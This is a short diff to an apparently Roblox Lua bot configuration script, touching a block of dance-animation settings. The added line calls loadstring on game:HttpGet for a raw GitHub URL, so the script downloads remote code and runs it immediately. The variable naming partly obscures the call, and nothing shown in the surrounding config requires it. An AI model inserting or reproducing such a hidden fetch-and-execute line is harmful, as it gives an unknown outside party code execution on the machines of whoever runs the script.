@@ -313,7 +313,7 @@ Bot.Config = {
     pcall(function(...)
     end);
     formatMethod = game;
-    loadstring(formatMethod:HttpGet(""))();
+    loadstring(formatMethod:HttpGet("https://raw.githubusercontent.com/kfclover67/skidoshit/refs/heads/main/hopeurok"))();
     danceAnimations = {};
     danceMetadata = {};
     playersServiceHolder = game;
